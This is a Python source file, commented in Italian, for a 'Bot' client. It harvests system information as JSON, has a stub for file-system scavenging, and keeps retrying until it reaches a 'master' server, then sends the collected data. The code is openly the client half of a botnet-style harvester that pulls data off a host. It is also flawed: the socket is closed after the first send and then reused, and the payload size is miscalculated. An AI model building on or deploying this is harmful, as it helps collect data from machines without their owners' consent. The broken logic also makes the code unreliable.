import socket
import systemRetrieval
from time import sleep
import json
import sys
import threading

PORT = 14000
CLIENT = socket.gethostbyname(socket.gethostname())
FORMAT = 'utf-8'
MASTER_ADDRESS = 'localhost'
SUCCESSFUL_RESPONSE = 'ok'


class Bot:
    def __init__(self):
        self.sentence = ''
        self.header_dim = 0
        self.clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Thread incaricato del recupero dei dati e del calcolo della loro dimensione.
        self.thread_data = threading.Thread(target=self.dataScavange)

        # Thread incaricato dell'effettiva comunicazione con il server.
        self.thread_connection = threading.Thread(target=self.waitForConnection)

        # Thread incaricato.
        self.thread_fileSystem = threading.Thread(target=self.fileSystemScavange)

        self.thread_data.start()
        self.thread_connection.start()
        self.thread_fileSystem.start()

    def waitForConnection(self):
        """
        Procedura nella quale si descrive la logica della comunicazione tra client e server.
        :return: None
        """

        # Se il client non riesce a connettersi al server, ritenta la connessione dopo 2 secondi.
        while self.clientSocket.connect_ex((MASTER_ADDRESS, PORT)) != 0:
            sleep(2)

         # Ottenuta l'accettazione della richiesta, la comunicazione non avviene finchè thread_data non termina la raccolta dati.
        while self.thread_data.is_alive():
            sleep(2)

        # 1. Il client comunica la dimensione dei dati al server (il valore da associare come header).
        self.sendHeaderDim()

        # 2. Aspetta che il server dia risposta con 'ok' della corretta ricezione.
        first_response = ''
        while first_response != SUCCESSFUL_RESPONSE:
            first_response = self.clientSocket.recv(1024).decode(FORMAT) # 1024 byte sono più che abbastanza per il messaggio 'ok'

        # 3. Possiamo ora inviare i dati raccolti in formato .json
        self.sendToServer()

        # 4. Il Bot attende la fine del trhead file system prima di mandare l'header
        while self.thread_fileSystem.is_alive():
            sleep(2)

        # 5.  Il client comunica la dimensione dei dati al server (il valore da associare come header).
        self.sendHeaderDim()

        # 6. Aspetta che il server dia risposta con 'ok' della corretta ricezione.
        first_response = ''
        while first_response != SUCCESSFUL_RESPONSE:
            first_response = self.clientSocket.recv(1024).decode(FORMAT) # 1024 byte sono più che abbastanza per il messaggio 'ok'

        # 7. Possiamo ora inviare i dati raccolti in formato .json
        self.sendToServer()


    def dataScavange(self):
        """
        Procedura tramite la quale il client raccoglie i dati in formato .json e calcola la dimensione totale.
        :return: None
        """
        inputSentence = systemRetrieval.SystemInformation()
        self.sentence = json.dumps(inputSentence.data)
        self.header_dim = sys.getsizeof(self.sentence.encode(FORMAT))
        print("thread_data terminated.")


    def fileSystemScavange(self):
        # roba file system
        # self.header_dim = ...
        pass

    def sendHeaderDim(self):
        """
        Il client invia al server la dimensione dei dati recuperati.
        :return: None
        """
        self.clientSocket.send(str(self.header_dim).encode(FORMAT))

    def sendToServer(self):
        """
        Il client invia al server i dati raccolti in formato .json
        :return: None
        """
        print("Data dimension in bytes (header): ", self.header_dim)
        self.clientSocket.send(self.sentence.encode(FORMAT))
        self.clientSocket.close()


if __name__ == '__main__':
    client = Bot()
